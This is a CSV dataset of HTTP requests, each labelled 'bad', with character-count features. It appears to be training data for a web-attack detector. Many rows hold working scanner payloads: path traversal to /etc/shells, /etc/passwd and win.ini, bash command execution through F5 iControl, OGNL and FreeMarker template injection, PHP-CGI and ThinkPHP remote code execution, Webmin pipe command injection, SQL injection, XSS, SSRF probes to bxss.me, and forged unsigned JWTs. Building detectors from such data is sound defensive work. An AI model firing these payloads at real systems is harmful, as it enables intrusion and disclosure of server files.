method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg,,0,0,0,0,0,1,bad
GET,/js/date.js,,0,0,0,0,0,0,bad
GET,/users/sign_in,,0,0,0,0,0,0,bad
POST,/pages/doenterpagevariables.action,queryString=bbbaaa\u0027%2b#{3*33333}%2b\u0027bbbaaa,0,0,0,0,0,0,bad
GET,/http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/images/general/cvv.gif,,0,0,0,0,0,0,bad
GET,/sitemap.xml.gz,,0,0,0,0,0,0,bad
GET,/global/license.txt,,0,0,0,0,0,0,bad
GET,/admin,,0,0,0,0,0,0,bad
POST,/mgmt/tm/util/bash,"{""utilCmdArgs"": ""-c 'id'"", ""command"": ""run""}",2,8,0,0,4,0,bad
GET,/CONTRIBUTING.md,,0,0,0,0,0,0,bad
GET,/cluster/cluster,,0,0,0,0,0,0,bad
GET,/vendor/elgg/elgg/CONTRIBUTING.md,,0,0,0,0,0,0,bad
GET,/k4oYMcSWWD.aspx,,0,0,0,0,0,0,bad
GET,/h2-console/,,0,0,0,0,0,0,bad
POST,/pages/doenterpagevariables.action,queryString=bbbaaa\u0027%2b#{3*33333}%2b\u0027bbbaaa,0,0,0,0,0,0,bad
GET,/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};top[%27al%27%2B%27ert%27](31337);if(1){//,,5,0,0,2,0,0,bad
GET,/readme.html,,0,0,0,0,0,0,bad
GET,/js/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/v1/agent/self,,0,0,0,0,0,0,bad
GET,/locales/en/button/mblue_off.gif,,0,0,0,0,0,0,bad
GET,/global/css/ui.daterangepicker.css,,0,0,0,0,0,0,bad
GET,/themes/blueSilence/screenshot.jpg,,0,0,0,0,0,0,bad
GET,/COPYING.txt,,0,0,0,0,0,0,bad
GET,/docs/databases/sqlite.txt,,0,0,0,0,0,0,bad
GET,/DEVELOPMENT.md,,0,0,0,0,0,0,bad
GET,/LetsEncrypt/Index?fileName=c:\windows\win.ini,,0,0,0,0,0,0,bad
GET,/scripts/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/resizer.debug,,0,0,0,0,0,0,bad
GET,/.well-known/acme-challenge/<69028794>,,0,0,0,0,0,0,bad
GET,/screenshot/http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/cache/index.html,,0,0,0,0,0,0,bad
GET,/static/css/animate.css,,0,0,0,0,0,0,bad
GET,/administration/images/admins.gif,,0,0,0,0,0,0,bad
GET,/tests/data/lorem.txt,,0,0,0,0,0,0,bad
GET,/core/css/images/ui-bg_glass_100_f8f8f8_1x400.png,,0,0,0,0,0,0,bad
GET,/resizer.debug.ashx,,0,0,0,0,0,0,bad
GET,/concat?/%2557EB-INF/web.xml,,0,0,0,0,0,0,bad
GET,/v2/docs,,0,0,0,0,0,0,bad
GET,/render/http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,/admin/minify.txt,,0,0,0,0,0,0,bad
GET,/_build/docs/themes/modx/css/api-content.css,,0,0,0,0,0,0,bad
GET,/agpl.txt,,0,0,0,0,0,0,bad
GET,/admin/data/be-provinces.txt,,0,0,0,0,0,0,bad
GET,/h2/,,0,0,0,0,0,0,bad
GET,/horde/imp/test.php,,0,0,0,0,0,0,bad
GET,/mifs/aad/api/v2/authorized/users,,0,0,0,0,0,0,bad
GET,/scripts/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/assets/default/images/check_status_btn.png,,0,0,0,0,0,0,bad
GET,/ui/favicon.ico,,0,0,0,0,0,0,bad
GET,/doc/README_ca.txt,,0,0,0,0,0,0,bad
GET,/images/ranks/rank0.gif,,0,0,0,0,0,0,bad
GET,/static?/%2557EB-INF/web.xml,,0,0,0,0,0,0,bad
GET,/tree,,0,0,0,0,0,0,bad
GET,/%u002e/WEB-INF/web.xml,,0,0,0,0,0,0,bad
POST,/?PHPRC=/dev/fd/0,"auto_prepend_file=""/etc/passwd""",0,2,0,0,0,0,bad
POST,/CMSInstall/install.aspx,,0,0,0,0,0,0,bad
GET,/.github/ISSUE_TEMPLATE/feature_request.md,,0,0,0,0,0,0,bad
GET,/architecture.md,,0,0,0,0,0,0,bad
GET,/CODE_OF_CONDUCT.md,,0,0,0,0,0,0,bad
GET,/error500.html,,0,0,0,0,0,0,bad
GET,/assets/img/ajax-loader.gif,,0,0,0,0,0,0,bad
GET,/query?db=db&q=SHOW+DATABASES,,0,0,0,0,1,0,bad
GET,/pub/guiedit/attach.gif,,0,0,0,0,0,0,bad
GET,"/login.jsp?wvstest=javascript:domxssExecutionSink(1,""'/""%3E%3Cxsstag%3E()locxss"")&_nocache=03029",,1,3,0,2,0,0,bad
POST,/webauth_operation.php,"rs=do_upload&rsargs[]=[{""fileName"": ""test.txt"", ""fileData"": ""dGVzdA=="", ""csize"": 4}]",0,10,0,0,5,0,bad
GET,/info,,0,0,0,0,0,0,bad
GET,/img/bg_loader.png,,0,0,0,0,0,0,bad
GET,/prestashop/img/bg_loader.png,,0,0,0,0,0,0,bad
POST,/auth/realms/master/clients-registrations/default,"{""test<jzxtyskzls>"":0}",0,2,0,0,0,0,bad
GET,/login,,0,0,0,0,0,0,bad
GET,/skins/elastic/thumbnail.png,,0,0,0,0,0,0,bad
GET,/.%00/WEB-INF/web.xml,,0,0,0,0,0,0,bad
GET,/query?db=db&q=SHOW+DATABASES,,0,0,0,0,1,0,bad
GET,/qa-theme/Candy/a-count-icon-ie6.png,,0,0,0,0,0,0,bad
GET,/htmlarea/s9y_cketoolbar.css,,0,0,0,0,0,0,bad
POST,/./RestAPI/LogonCustomization,methodToCall=previewMobLogo,0,0,0,0,0,0,bad
GET,/fonts/tahoma.ttf,,0,0,0,0,0,0,bad
GET,/serendipity_editor.js,,0,0,0,0,0,0,bad
GET,/skins/classic/safari.css,,0,0,0,0,0,0,bad
GET,/css/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/LICENSE.md,,0,0,0,0,0,0,bad
GET,/conf/readme.txt,,0,0,0,0,0,0,bad
POST,/auth/realms/master/clients-registrations/openid-connect,"{""test<mdvhggapaj>"":0}",0,2,0,0,0,0,bad
POST,/lucee/admin/imgProcess.cfm?file=/../../../context/luc068623.cfm,imgSrc=luc6075013117959074008659625cul,0,0,0,0,0,0,bad
GET,/api/geojson?url=file:///etc/shells,,0,0,0,0,0,0,bad
GET,/wp-includes/images/arrow-pointer-blue.png,,0,0,0,0,0,0,bad
GET,/templates/gallery/img/bg.jpg,,0,0,0,0,0,0,bad
GET,/resources/design/vanillicon.css,,0,0,0,0,0,0,bad
GET,/licenses/copyright.html,,0,0,0,0,0,0,bad
GET,/owa/auth/y.js,,0,0,0,0,0,0,bad
GET,/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com,,0,0,0,0,0,0,bad
GET,/zp-core/admin-statistics.css,,0,0,0,0,0,0,bad
GET,/javascript/ajax/unittest.min.js,,0,0,0,0,0,0,bad
GET,/LEGACY.md,,0,0,0,0,0,0,bad
GET,/etc/shells,,0,0,0,0,0,0,bad
GET,/typo3/sysext/core/Resources/Private/Charsets/unidata/Translit.txt,,0,0,0,0,0,0,bad
POST,/realms/master/clients-registrations/openid-connect,"{""test<rlsgjtrwdl>"":0}",0,2,0,0,0,0,bad
GET,/api/session/properties,,0,0,0,0,0,0,bad
POST,/minio/bootstrap/v1/verify,,0,0,0,0,0,0,bad
GET,/autodiscover/autodiscover.json?@foo.com/owa/?&Email=autodiscover/autodiscover.json%3F@foo.com,,0,0,0,0,0,0,bad
GET,/css/default/images/menucurve.gif,,0,0,0,0,0,0,bad
GET,/public/android-chrome-192x192.png,,0,0,0,0,0,0,bad
GET,/styles/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
POST,/mifs/.;/services/LogService,c H testM,0,0,0,0,0,0,bad
GET,/moveitisapi/moveitisapi.dll?action=capa,,0,0,0,0,0,0,bad
GET,/nacos/v1/auth/users/?pageNo=1&pageSize=10,,0,0,0,0,0,0,bad
GET,/sample-public-api.txt,,0,0,0,0,0,0,bad
GET,/nette.micro?callback=phpinfo&cmd=1,,0,0,0,0,0,0,bad
GET,/static\..\..\..\..\..\..\..\..\..\etc\shells,,0,0,0,0,0,0,bad
GET,/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=http://example.com/,,0,0,0,0,0,0,bad
POST,/doLogin,"------WebKitFormBoundarynsqKClfDOHog1b87
Content-Disposition: form-data; name=""uid""

pHqghUme
------WebKitFormBoundarynsqKClfDOHog1b87
Content-Disposition: form-data; name=""passw""

u]H[ww6KrA9F.x-F
------WebKitFormBoundarynsqKClfDOHog1b87--
",0,4,10,0,4,1,bad
GET,/api/5/nginx,,0,0,0,0,0,0,bad
GET,/api/3/nginx,,0,0,0,0,0,0,bad
GET,/dashboard.html,,0,0,0,0,0,0,bad
GET,/licenses/SPL-1.1.2.txt,,0,0,0,0,0,0,bad
GET,/styles/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/upstream_conf?upstream=backend,,0,0,0,0,0,0,bad
POST,/nagiosql/admin/helpedit.php,selInfoKey1=1'UNION SELECT MD5(31337) -- &hidKey1=common&selInfoKey2=&hidKey2=free_variables_name&selInfoVersion=&hidVersion=&taContent=&modus=0,1,0,1,1,4,0,bad
GET,/status,,0,0,0,0,0,0,bad
GET,/api/4/nginx,,0,0,0,0,0,0,bad
GET,/json,,0,0,0,0,0,0,bad
GET,/?[[../../../../config:secret]],,0,0,0,0,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
GET,/api/6/nginx,,0,0,0,0,0,0,bad
GET,/static/../../../../../../../../../../../etc/shells,,0,0,0,0,0,0,bad
GET,/docs/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/nginx_status,,0,0,0,0,0,0,bad
GET,/,z=1,0,0,0,0,0,0,bad
GET,/_odata,,0,0,0,0,0,0,bad
GET,/web/static/c:/windows/win.ini,,0,0,0,0,0,0,bad
GET,/getFavicon?host=bxss.me/t/fit.txt?,,0,0,0,0,0,0,bad
POST,/doLogin,"------WebKitFormBoundarysRZRsHmaAaAuULqG
Content-Disposition: form-data; name=""uid""

pHqghUme
------WebKitFormBoundarysRZRsHmaAaAuULqG
Content-Disposition: form-data; name=""passw""

u]H[ww6KrA9F.x-F
------WebKitFormBoundarysRZRsHmaAaAuULqG--
",0,4,10,0,4,1,bad
GET,/lua/login.lua,,0,0,0,0,0,0,bad
GET,/_next/static/../server/pages-manifest.json,,0,0,0,0,0,0,bad
GET,/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp,,0,0,0,0,0,0,bad
GET,/.well-known/openid-configuration,,0,0,0,0,0,0,bad
GET,/.well-known/ai-plugin.json,,0,0,0,0,0,0,bad
GET,/__nuxt_vite_node__/module/uapxe,,0,0,0,0,0,0,bad
GET,/api/v1/label/__name__/values,,0,0,0,0,0,0,bad
GET,/docs/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/web/database/manager,,0,0,0,0,0,0,bad
GET,/OA_HTML/AppsLocalLogin.jsp,,0,0,0,0,0,0,bad
GET,/system/console/gatewaystatus,,0,0,0,0,0,1,bad
GET,/index.php,,0,0,0,0,0,0,bad
GET,/stats,,0,0,0,0,0,0,bad
GET,/xprober.php,,0,0,0,0,0,0,bad
GET,/api/v1/label/__name__/values,,0,0,0,0,0,0,bad
GET,/unauth/php/change_password.php/%22%3E%3Cnnybyxkxja%3E,,0,1,0,0,0,0,bad
GET,/.//WEB-INF,,0,0,0,0,0,0,bad
GET,/V1/OData/OData.svc/,,0,0,0,0,0,0,bad
GET,/vendor/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/pentaho/api/userrolelist/systemRoles?require-cfg.js,,0,0,0,0,0,1,bad
GET,//bxss.me,,0,0,0,0,0,0,bad
GET,/status,,0,0,0,0,0,0,bad
GET,/opcache/index.php,,0,0,0,0,0,0,bad
GET,/webpagetest/index.php,,0,0,0,0,0,0,bad
GET,/dana-na///css/ds.js?/dana/html5acc/guacamole/,,0,0,0,0,0,0,bad
GET,/vendor/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/opensearch.xml,,0,0,0,0,0,0,bad
GET,/opcache.php,,0,0,0,0,0,0,bad
GET,/V2/OData/OData.svc/,,0,0,0,0,0,0,bad
GET,/\bxss.me,,0,0,0,0,0,0,bad
GET,/assets/%2f,,0,0,0,0,0,0,bad
GET,/ha-stats,,0,0,0,0,0,0,bad
GET,/?pp=env,,0,0,0,0,0,0,bad
GET,//bxss.me/%2e%2e,,0,0,0,0,0,0,bad
GET,/admin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/opensearch,,0,0,0,0,0,0,bad
GET,/opcache-status/opcache.php,,0,0,0,0,0,0,bad
GET,/V3/OData/OData.svc/,,0,0,0,0,0,0,bad
POST,/tolnfqslrn.html,,0,0,0,0,0,0,bad
GET,/haproxy?stats,,0,0,0,0,0,0,bad
GET,/?id.__proto__.expect=100-continue&id.constructor.prototype.expect=100-continue&id[__proto__][expect]=100-continue&__proto__.expect=100-continue&constructor.prototype.expect=100-continue&,,0,0,0,0,0,0,bad
GET,////bxss.me/%2e%2e,,0,0,0,0,0,0,bad
GET,/V4/OData/OData.svc/,,0,0,0,0,0,0,bad
GET,/vmp_getinfo,,0,0,0,0,0,0,bad
GET,/admin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/php-opcache-status/,,0,0,0,0,0,0,bad
POST,/EemAdminService/EemAdmin,"<?xml version='1.0' encoding='utf8'?>
    <ns0:Envelope xmlns:ns0=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:ns1=""http://sap.com/smd/eem/admin/"">
       <ns0:Header />
       <ns0:Body>
          <ns1:getAllAgentInfo />
       </ns0:Body>
    </ns0:Envelope>",4,4,0,0,45,0,bad
GET,/searchblox/plugin/index.html,,0,0,0,0,0,0,bad
GET,/efrlehpiei,,0,0,0,0,0,0,bad
GET,//bxss.me//%2F..,,0,0,0,0,0,0,bad
GET,/OData/OData.svc/,,0,0,0,0,0,0,bad
GET,/nginx_status,,0,0,0,0,0,0,bad
GET,/plugin/index.html,,0,0,0,0,0,0,bad
GET,/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3atest(4974667640),,0,0,0,1,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/app/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells,,0,0,0,0,0,0,bad
GET,/pp404?id.__proto__.expect=100-continue&id.constructor.prototype.expect=100-continue&id[__proto__][expect]=100-continue&__proto__.expect=100-continue&constructor.prototype.expect=100-continue&,,0,0,0,0,0,0,bad
GET,/\bxss.me//%2F..,,0,0,0,0,0,0,bad
GET,/OData/,,0,0,0,0,0,0,bad
GET,/cgi-bin/jarrewrite.sh,,0,0,0,0,0,0,bad
GET,/opcache-status/,,0,0,0,0,0,0,bad
GET,/basic_status,,0,0,0,0,0,0,bad
GET,/opcache-gui/index.php,,0,0,0,0,0,0,bad
GET,/web.config.i18n.ashx?l=en-US&v=zzztest,,0,0,0,0,0,0,bad
GET,/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fshells%23foo/development,,0,0,0,0,0,0,bad
GET,/app/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells,,0,0,0,0,0,0,bad
GET,/log/view?filename=shells&base=..%2Fetc,,0,0,0,0,0,0,bad
GET,/redirect/bxss.me,,0,0,0,0,0,0,bad
GET,/odata,,0,0,0,0,0,0,bad
GET,/api/auth/cognito/callback?access_token=test&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYWN4dGVzdCIsImVtYWlsIjoiYWN4dGVzdEBleGFtcGxlLmNvbSJ9.,,0,0,0,0,0,0,bad
GET,/swagger-ui,,0,0,0,0,0,0,bad
GET,/swaggerui,,0,0,0,0,0,0,bad
GET,/api-reference,,0,0,0,0,0,0,bad
GET,/swagger/ui/index,,0,0,0,0,0,0,bad
GET,/swagger-ui.html,,0,0,0,0,0,0,bad
GET,/api-docs/,,0,0,0,0,0,0,bad
GET,/api/swagger/swagger-ui.html,,0,0,0,0,0,0,bad
GET,/api/apidocs,,0,0,0,0,0,0,bad
GET,/api/swagger-resources,,0,0,0,0,0,0,bad
GET,/api/__swagger__/,,0,0,0,0,0,0,bad
GET,/api/swagger/ui/index,,0,0,0,0,0,0,bad
GET,/api/v1/,,0,0,0,0,0,0,bad
GET,/classicapi/doc/,,0,0,0,0,0,0,bad
GET,/api/v1/ui/,,0,0,0,0,0,0,bad
GET,/js/routing?callback=fos.Router.setData,,0,0,0,0,0,0,bad
GET,/_fragment,,0,0,0,0,0,0,bad
GET,/app/rest/users/acxtest/RPC2,,0,0,0,0,0,0,bad
GET,/idm/v2/api-docs,,0,0,0,0,0,0,bad
GET,/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337,,0,0,0,0,0,0,bad
GET,/out?//bxss.me,,0,0,0,0,0,0,bad
GET,/%2e%2e/index.js,,0,0,0,0,0,0,bad
GET,/swagger/swagger-ui.html,,0,0,0,0,0,0,bad
GET,/api/docs/,,0,0,0,0,0,0,bad
GET,/api/api-docs,,0,0,0,0,0,0,bad
GET,/api/swagger-resources/restservices/v2/api-docs,,0,0,0,0,0,0,bad
GET,/__swagger__/,,0,0,0,0,0,0,bad
GET,/_swagger_/,,0,0,0,0,0,0,bad
GET,/api/v1/openapi,,0,0,0,0,0,0,bad
GET,/munin/,,0,0,0,0,0,0,bad
GET,/index.html,,0,0,0,0,0,0,bad
GET,/docs/api-reference,,0,0,0,0,0,0,bad
GET,/nifi-api/process-groups/root,,0,0,0,0,0,0,bad
GET,/swagger/docs/v1,,0,0,0,0,0,0,bad
GET,/swagger/index.html,,0,0,0,0,0,0,bad
GET,/api/index.html,,0,0,0,0,0,0,bad
GET,/api/swagger-ui/api-docs,,0,0,0,0,0,0,bad
GET,/api/swagger/static/index.html,,0,0,0,0,0,0,bad
GET,/%2e%2e/debug.js,,0,0,0,0,0,0,bad
GET,/swagger-resources/restservices/v2/api-docs,,0,0,0,0,0,0,bad
GET,/api/,,0,0,0,0,0,0,bad
GET,/docs/,,0,0,0,0,0,0,bad
GET,/doc,,0,0,0,0,0,0,bad
GET,/api/swagger-ui.html,,0,0,0,0,0,0,bad
GET,/ui/vropspluginui/rest/services/getstatus,,0,0,0,0,0,0,bad
GET,/api/swagger/index.html,,0,0,0,0,0,0,bad
GET,/api/_swagger_/,,0,0,0,0,0,0,bad
GET,/eam/vib?id=C:\Windows\win.ini,,0,0,0,0,0,0,bad
GET,/api/v2/doc,,0,0,0,0,0,0,bad
POST,/casa/nodes/thumbprints,"[""127.0.0.1:443/ui/""]",0,2,0,0,0,0,bad
GET,/reference,,0,0,0,0,0,0,bad
GET,/api/swagger,,0,0,0,0,0,0,bad
GET,/api/spec,,0,0,0,0,0,0,bad
GET,/vendor/amnuts/opcache-gui/index.php,,0,0,0,0,0,0,bad
GET,/auth/cognito/callback?access_token=test&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYWN4dGVzdCIsImVtYWlsIjoiYWN4dGVzdEBleGFtcGxlLmNvbSJ9.,,0,0,0,0,0,0,bad
GET,/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/shells,,0,0,0,0,0,0,bad
GET,/api/v1/doc,,0,0,0,0,0,0,bad
GET,"/catalog-portal/ui/oauth/verify?error=&deviceUdid=$%7b""freemarker.template.utility.Execute""%3fnew()(""cat+/etc/shells"")%7d",,0,4,0,2,1,0,bad
GET,/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shells,,0,0,0,0,0,0,bad
GET,/eam/vibd?id=C:\Windows\win.ini,,0,0,0,0,0,0,bad
GET,/metrics,,0,0,0,0,0,0,bad
POST,/password_change.cgi,user=wheel&pam=1&expired=2|echo+$((74759*97085))&old=test|echo+$((74759*97085))&new1=wheel&new2=wheel,0,0,0,4,0,0,bad
GET,/%2e%2e/release.js,,0,0,0,0,0,0,bad
GET,/monitor/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file://C:\Windows\win.ini,,0,0,0,0,0,0,bad
GET,/api/help,,0,0,0,0,0,0,bad
GET,/axis2/services/listServices,,0,0,0,0,0,0,bad
GET,/console/images/%252e%252e%252f/console.portal?_nfpb=true&_pageLabel=&handle=1,,0,0,0,0,0,0,bad
GET,/metrics,,0,0,0,0,0,0,bad
GET,/xbovbcpvli?cb803535=1,,0,0,0,0,0,0,bad
POST,/console/j_security_check,j_username=system&j_password=manager&submit=Login,0,0,0,0,0,1,bad
GET,/eZServerMonitor/,,0,0,0,0,0,0,bad
GET,/out/?//bxss.me,,0,0,0,0,0,0,bad
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,bad
GET,/login.jsp?cb703509=1,,0,0,0,0,0,0,bad
GET,/console/images/%252e%252e%252f/console.portal?_nfpb=true&_pageLabel=&handle=1,,0,0,0,0,0,0,bad
GET,/dswsbobje/services/listServices,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/ivjycsxtzo?cb352648=1,,0,0,0,0,0,0,bad
GET,/roller-ui/login.rol?pageTitle=${new%20java.lang.Integer(100187%2b100046)},,0,0,0,1,1,0,bad
GET,/cgi-bin/redirect.cgi?http://bxss.me,,0,0,0,0,0,0,bad
GET,/axis1/services/listServices,,0,0,0,0,0,0,bad
GET,/server-info,,0,0,0,0,0,0,bad
GET,/sjnuptpqzf?cb504466=1,,0,0,0,0,0,0,bad
GET,/solr/admin/,,0,0,0,0,0,0,bad
GET,/index,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/installer,,0,0,0,0,0,0,bad
GET,/debug/vars,,0,0,0,0,0,0,bad
GET,/hnudjixjyd?cb613038=1,,0,0,0,0,0,0,bad
GET,/server-status,,0,0,0,0,0,0,bad
<script>alert(12345)</script>,/,,0,0,0,0,0,0,bad
GET,/default,,0,0,0,0,0,0,bad
GET,/Account/Register.aspx?ReturnUrl=,,0,0,0,0,0,0,bad
GET,/catalog/install/index.php,,0,0,0,0,0,0,bad
GET,/axis/services/listServices,,0,0,0,0,0,0,bad
GET,/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/hosts,,0,0,0,0,0,0,bad
GET,/stronghold-info,,0,0,0,0,0,0,bad
GET,/plugins/servlet/oauth/users/icon-uri?consumerUri=http://bxss.me/t/fit.txt,,0,0,0,0,0,0,bad
GET,//bxss.me/..;/images,,0,0,0,0,0,0,bad
GET,/cgi-mod/view_help.cgi?locale=/..//../..//../..//../..//../..//etc/passwd,,0,0,0,0,0,0,bad
GET,/+CSCOU+/../+CSCOE+/files/file_list.json,,0,0,0,0,4,0,bad
GET,/appmetrics-dash,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/vobsbpuizk?cb821079=1,,0,0,0,0,0,0,bad
GET,/|~.aspx,,0,0,0,0,0,0,bad
GET,/solr/select/?q=test,,0,0,0,0,0,1,bad
POST,/CMSPages/Staging/syncserver.asmx,"<soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:wsse=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"" xmlns:wsu=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"">
    <soap:Header>
      <wsse:Security soap:mustUnderstand=""1"">
        <wsse:UsernameToken xmlns:wsu=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" wsu:Id=""SecurityToken-a0665943-dce0-4f97-8cfc-67e29e1fd76a"">
          <wsse:Username>admin</wsse:Username>
        </wsse:UsernameToken>
      </wsse:Security>
    </soap:Header>
    <soap:Body>
      <ProcessSynchronizationTaskWithoutBinary xmlns=""http://localhost/SyncWebService/SyncServer"">
        <taskTitle>string</taskTitle>
        <taskType>string</taskType>
        <taskObjectType>string</taskObjectType>
        <taskData>string</taskData>
        <systemVersion>9.0</systemVersion>
      </ProcessSynchronizationTaskWithoutBinary>
    </soap:Body>
  </soap:Envelope>",0,18,0,0,117,2,bad
GET,//bxss.me/..;/docs,,0,0,0,0,0,0,bad
GET,/wp-admin/setup-config.php,,0,0,0,0,0,0,bad
GET,/jboss-net/services/listServices,,0,0,0,0,0,0,bad
GET,/ltsjqflmly?cb988002=1,,0,0,0,0,0,0,bad
GET,/stronghold-status,,0,0,0,0,0,0,bad
GET,/dashboard/,,0,0,0,0,0,0,bad
GET,/inexistent_file_name.inexistent0123450987.cfm,,0,0,0,0,0,0,bad
GET,/FkC94I1A34.cfm,,0,0,0,0,0,0,bad
